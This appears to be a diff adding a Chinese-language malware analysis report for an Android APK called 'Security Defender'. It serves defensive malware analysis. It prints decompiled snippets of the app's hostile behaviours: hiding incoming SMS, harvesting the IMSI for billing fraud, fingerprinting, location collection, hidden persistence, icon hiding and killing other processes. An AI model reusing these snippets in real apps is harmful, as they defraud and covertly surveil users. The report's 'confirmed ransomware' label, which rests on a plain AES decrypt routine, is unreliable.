@@ -1,0 +1,305 @@
+{
+  "APK信息": {
+    "文件名": "43cc28d07518e54eb9839ecedbaea7cd0e53fa82ea02df0b0f8411ff1232f3a9.apk",
+    "sha256": "43cc28d07518e54eb9839ecedbaea7cd0e53fa82ea02df0b0f8411ff1232f3a9",
+    "包名": "com.antivirus.boost.clean.defender",
+    "应用名": "Security Defender",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 903.9
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\yellow\\security\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) { abortBroadcast(); Bundle extras = intent.getExtras(); if (extras != null) { Object[] objArr = (Object[]) extras.get(\"pdus\"); SmsMessage[] smsMessageArr = new SmsMessage[objArr.length]; for (int i = 0; i < objArr.length; i++) { smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]); } for (SmsMessage smsMessage : smsMessageArr) { smsMessage.getDisplayOriginatingAddress(); } } }",
+          "malicious_code_snippet_context": "  \n      @Override // android.content.BroadcastReceiver\n      public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n              abortBroadcast();\n              new StringBuilder();\n              Bundle extras = intent.getExtras();",
+          "behavior_description": "该BroadcastReceiver监听SMS_RECEIVED广播，收到短信后立即调用abortBroadcast()中止广播传播，使系统短信应用和其他应用无法收到该短信，从而对用户隐藏短信内容。随后从intent的extras中提取pdus数据并解析为SmsMessage对象，读取发件人地址和短信内容。数据流向：SMS_RECEIVED广播(intent extras/pdus) → abortBroadcast()隐藏短信 + 读取短信内容(发件人地址等)。",
+          "glm_analyzed": true
+        },
+        {
+          "class_path": "Lak\\aa;",
+          "method_signature": "e(Context context)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "String subscriberId = ((TelephonyManager) context.getSystemService(m())).getSubscriberId();\nreturn (subscriberId == null || TextUtils.isEmpty(subscriberId)) ? n() : subscriberId;",
+          "malicious_code_snippet_context": "  \n      public static String e(Context context) {\n          try {\n>>>             String subscriberId = ((TelephonyManager) context.getSystemService(m())).getSubscriberId();\n>>>             return (subscriberId == null || TextUtils.isEmpty(subscriberId)) ? n() : subscriberId;\n          } catch (Throwable th) {\n              return o();\n          }",
+          "behavior_description": "通过 TelephonyManager.getSubscriberId() 获取设备的 IMSI（国际移动用户标识符），IMSI 是 WAP 计费欺诈的关键参数，恶意软件利用 IMSI 可以在用户不知情的情况下向运营商发起 WAP 计费请求，完成扣费。代码中使用了混淆方法名 m() 来获取 TelephonyManager 服务名，具有隐蔽意图。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getImei",
+          "getSubscriberId",
+          "ANDROID_ID",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lak\\aa;",
+          "method_signature": "d(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "String string = Settings.Secure.getString(context.getContentResolver(), k());\nreturn ((TelephonyManager) context.getSystemService(l())).getDeviceId() + string;",
+          "malicious_code_snippet_context": "      public static String d(Context context) {\n          String j = j();\n          try {\n>>>             String string = Settings.Secure.getString(context.getContentResolver(), k());\n>>>             try {\n                  return ((TelephonyManager) context.getSystemService(l())).getDeviceId() + string;\n              } catch (Exception e) {\n                  return string;",
+          "behavior_description": "该方法通过 TelephonyManager.getDeviceId() 获取设备 IMEI，同时通过 Settings.Secure.getString() 获取 Android ID 等设备标识符，将两者拼接后返回。这些设备指纹信息可被用于唯一标识和追踪用户设备，在恶意样本上下文中通常作为隐私窃取的前置数据采集环节，后续可能被上传至C2服务器。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.ACCESS_FINE_LOCATION",
+          "android.permission.ACCESS_COARSE_LOCATION"
+        ],
+        "字符串": [
+          "getLastKnownLocation",
+          "requestLocationUpdates"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lak\\qm;",
+          "method_signature": "if(bestProvider != null && (lastKnownLocation = locationManager.getLastKnownLocation(bestProvider)",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);\nCriteria criteria = new Criteria();\ncriteria.setCostAllowed(false);\ncriteria.setAccuracy(2);\nString bestProvider = locationManager.getBestProvider(criteria, true);\nif (bestProvider != null && (lastKnownLocation = locationManager.getLastKnownLocation(bestProvider)) != null) {\n    return lastKnownLocation.getLatitude() + \"x\" + lastKnownLocation.getLongitude();\n}",
+          "malicious_code_snippet_context": "              return \"\";\n          }\n          try {\n>>>             LocationManager locationManager = (LocationManager) context.getSystemService(FirebaseAnalytics.Param.LOCATION);\n>>>             Criteria criteria = new Criteria();\n>>>             criteria.setCostAllowed(false);\n>>>             criteria.setAccuracy(2);\n>>>             String bestProvider = locationManager.getBestProvider(criteria, true);\n>>>             if (bestProvider != null && (lastKnownLocation = locationManager.getLastKnownLocation(bestProvider)) != null) {\n>>>                 return lastKnownLocation.getLatitude() + \"x\" + lastKnownLocation.getLongitude();\n>>>             }\n              return \"\";\n          } catch (Exception e) {\n              Log.e(\"getLocation\", \"getLocation>>>\", e);",
+          "behavior_description": "代码通过 LocationManager 获取设备最佳位置提供者，并调用 getLastKnownLocation() 获取最近一次已知地理位置，将经纬度拼接为字符串返回。数据流向为：LocationManager.getLastKnownLocation()（获取GPS坐标）→ 返回经纬度字符串（供调用方收集或上传）。在已确认的恶意样本中，此行为属于过度收集用户位置隐私，位置数据可能被进一步上传至C2服务器用于用户追踪。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lak\\aaj;",
+          "method_signature": "a(String str)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "this.f386a = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\nthis.f386a.init(2, secretKeySpec, ivParameterSpec);\nreturn new String(this.f386a.doFinal(b(str)), AudienceNetworkActivity.WEBVIEW_ENCODING);",
+          "malicious_code_snippet_context": "          a(byte[] bArr, byte[] bArr2) throws Exception {\n              SecretKeySpec secretKeySpec = new SecretKeySpec(bArr, \"AES\");\n              IvParameterSpec ivParameterSpec = new IvParameterSpec(bArr2);\n>>>             this.f386a = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n>>>             this.f386a.init(2, secretKeySpec, ivParameterSpec);\n>>>         }\n  \n          String a(String str) throws Exception {\n              return new String(this.f386a.doFinal(b(str)), AudienceNetworkActivity.WEBVIEW_ENCODING);",
+          "behavior_description": "使用AES/CBC/PKCS5Padding算法初始化Cipher为解密模式（init mode=2=DECRYPT_MODE），对输入的十六进制编码字符串先进行hex解码（b(str)），再通过doFinal()执行AES解密，最终返回明文字符串。在勒索软件上下文中，此解密操作可能用于运行时解密硬编码的C2地址、加密密钥或其他配置信息，以躲避静态分析检测。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground",
+              "WakeLock"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lak\\ach;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 18)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT < 18) { startForeground(9527525, null); }",
+          "malicious_code_snippet_context": "if (Build.VERSION.SDK_INT < 18) { startForeground(9527525, null); }",
+          "behavior_description": "代码检测当前系统SDK版本，当版本低于18（Android 4.3）时调用startForeground传入null作为Notification参数。在旧版Android中，startForeground允许传入null通知，从而在不显示任何通知图标的情况下将服务提升为前台服务，实现隐蔽保活，防止服务被系统杀死。这是恶意软件常用的保活对抗技术。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "android.intent.action.SEND",
+          "com.tencent.mm",
+          "com.whatsapp",
+          "com.facebook.katana"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lak\\add;",
+          "method_signature": "a(Context context, String str, String str2, String str3, String str4, String str5)",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.SEND\");\nFile file = new File(str);\nif (file != null && file.exists() && file.isFile()) {\n    intent.setType(\"image/*\");\n    intent.putExtra(\"android.intent.extra.STREAM\", Uri.fromFile(file));\n    intent.putExtra(\"android.intent.extra.SUBJECT\", str4);\n    intent.putExtra(\"android.intent.extra.TITLE\", str3);\n    intent.putExtra(\"android.intent.extra.TEXT\", str2);\n    context.startActivity(Intent.createChooser(intent, str5));\n}",
+          "malicious_code_snippet_context": "      }\n  \n      public static void a(Context context, String str, String str2, String str3, String str4, String str5) {\n>>>         Intent intent = new Intent(\"android.intent.action.SEND\");\n>>>         File file = new File(str);\n>>>         if (file != null && file.exists() && file.isFile()) {\n>>>             intent.setType(\"image/*\");\n>>>             intent.putExtra(\"android.intent.extra.STREAM\", Uri.fromFile(file));\n>>>             intent.putExtra(\"android.intent.extra.SUBJECT\", str4);\n>>>             intent.putExtra(\"android.intent.extra.TITLE\", str3);\n>>>             intent.putExtra(\"android.intent.extra.TEXT\", str2);\n>>>             context.startActivity(Intent.createChooser(intent, str5));\n>>>         }\n      }\n  \n      public static String b() {",
+          "behavior_description": "该方法通过构造 ACTION_SEND Intent，将指定路径的文件（可能是恶意APK自身或诱饵图片）作为附件，配合外部传入的标题、主题和文本内容（可能包含社工诱导话术），调起系统分享选择器引导用户将恶意载荷传播至社交应用。数据来源为方法参数传入的文件路径(str)和文本内容(str2-str5)→危险操作为通过Intent.createChooser调起分享传播恶意文件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting",
+          "hideIcon"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lak\\bn;",
+          "method_signature": "if(!a(context)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) ActivityWrapper.class), 2, 1);",
+          "malicious_code_snippet_context": "              if (a(context)) {\n                  p();\n              }\n>>>             context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) ActivityWrapper.class), 2, 1);\n              ab.a().a(q(), r(), s(), new Properties());\n          } catch (Throwable th) {\n          }",
+          "behavior_description": "代码通过调用 PackageManager.setComponentEnabledSetting() 动态控制应用组件的启用状态。当传入参数为 false 时，将 ActivityWrapper 组件状态设置为 2 (COMPONENT_ENABLED_STATE_DISABLED)，从而隐藏应用图标，使其在桌面或应用列表中不可见，以逃避用户察觉和卸载。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "process_kill",
+      "中文名": "进程杀死",
+      "MITRE": "",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.KILL_BACKGROUND_PROCESSES"
+        ],
+        "字符串": [
+          "killBackgroundProcesses",
+          "forceStopPackage",
+          "killProcess"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "La\\k\\b\\a\\akm;",
+          "method_signature": "if(a2 != null && !a2.equals(this.f352a.getPackageName()",
+          "malicious_behavior": "process_kill",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "ActivityManager activityManager = (ActivityManager) this.f352a.getSystemService(\"activity\");\nString a2 = it.next().a();\nif (a2 != null && !a2.equals(this.f352a.getPackageName())) {\n    activityManager.killBackgroundProcesses(a2);\n}",
+          "malicious_code_snippet_context": "  \n      /* JADX INFO: Access modifiers changed from: private */\n      public void a(List<abe.a> list) {\n>>>         ActivityManager activityManager = (ActivityManager) this.f352a.getSystemService(\"activity\");\n>>>         Iterator<abe.a> it = list.iterator();\n>>>         while (it.hasNext()) {\n>>>             String a2 = it.next().a();\n>>>             if (a2 != null && !a2.equals(this.f352a.getPackageName())) {\n                  try {\n                      activityManager.killBackgroundProcesses(a2);\n                  } catch (Exception e) {",
+          "behavior_description": "代码遍历传入的应用包名列表，通过ActivityManager获取系统服务，并调用killBackgroundProcesses()强制结束非自身包名的后台进程。在恶意软件中，此行为通常用于杀死安全软件或竞争恶意软件的后台进程，以进行自我保护或干扰设备正常运行。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
